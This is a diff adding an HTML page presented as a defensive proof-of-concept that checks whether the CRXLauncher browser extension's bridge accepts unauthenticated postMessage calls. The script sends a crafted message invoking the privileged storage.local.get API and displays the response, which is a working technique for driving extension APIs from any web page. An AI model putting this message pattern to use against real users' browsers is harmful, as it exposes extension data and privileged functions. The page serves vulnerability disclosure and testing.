@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CRXLauncher postMessage Vulnerability Audit Tool</title>
+    <style>
+        body { font-family: sans-serif; margin: 40px; line-height: 1.6; }
+        .box { background: #f4f4f4; padding: 20px; border-radius: 8px; border: 1px solid #ddd; }
+        .result { margin-top: 20px; padding: 15px; border-radius: 6px; font-family: monospace; white-space: pre-wrap; }
+        .vuln { background: #fee; border: 1px solid #f88; color: #900; }
+        .safe { background: #efe; border: 1px solid #8f8; color: #090; }
+        button { padding: 10px 18px; font-size: 14px; cursor: pointer; border-radius: 4px; border: none; background: #0066cc; color: #fff; }
+    </style>
+</head>
+<body>
+    <h1>CRXLauncher Bridge Vulnerability Audit (Defensive PoC)</h1>
+    <div class="box">
+        <p>This defensive audit tool safely verifies whether the active browser session has <strong>CRXLauncher</strong> installed and exposes the unauthenticated <code>window.postMessage</code> API proxy vulnerability (CRX-0DAY-2026-01).</p>
+        <p><strong>Note:</strong> This script does not execute malicious payloads. It merely requests a non-destructive status method from the bridge.</p>
+        <button id="btnCheck">Run Audit Check</button>
+        <div id="resultBox" class="result" style="display:none;"></div>
+    </div>
+
+    <script>
+        document.getElementById('btnCheck').addEventListener('click', () => {
+            const result = document.getElementById('resultBox');
+            result.style.display = 'block';
+            result.className = 'result';
+            result.textContent = 'Probing window for CRXLauncher bridge listener...';
+
+            const testUuid = 'audit-' + Math.random().toString(36).substring(2);
+            let responded = false;
+
+            const listener = (event) => {
+                if (event.data && event.data.namespace === '__crxlauncher_window_communication') {
+                    if (event.data.type === 'response' && event.data.responseFor === testUuid) {
+                        responded = true;
+                        window.removeEventListener('message', listener);
+                        result.className = 'result vuln';
+                        result.textContent = 'CRITICAL VULNERABILITY CONFIRMED!\n\n' +
+                            'CRXLauncher bridge (brg.js) accepted an unauthenticated postMessage from origin "' + window.location.origin + '" without origin validation.\n' +
+                            'Response received: ' + JSON.stringify(event.data.response, null, 2) + '\n\n' +
+                            'Impact: Any website you visit can invoke privileged extension APIs across other tabs.';
+                    }
+                }
+            };
+
+            window.addEventListener('message', listener);
+
+            // Send benign probe to check bridge responsiveness
+            window.postMessage({
+                namespace: '__crxlauncher_window_communication',
+                target: 'content/bridge',
+                type: 'message',
+                name: 'chrome: call method',
+                uuid: testUuid,
+                data: {
+                    path: 'storage.local.get',
+                    args: [['crxlauncher__uuid']],
+                    hasCallback: true
+                }
+            }, '*');
+
+            setTimeout(() => {
+                if (!responded) {
+                    window.removeEventListener('message', listener);
+                    result.className = 'result safe';
+                    result.textContent = 'Probe timed out. The CRXLauncher bridge did not respond (extension not installed or bridge inactive on this origin).';
+                }
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
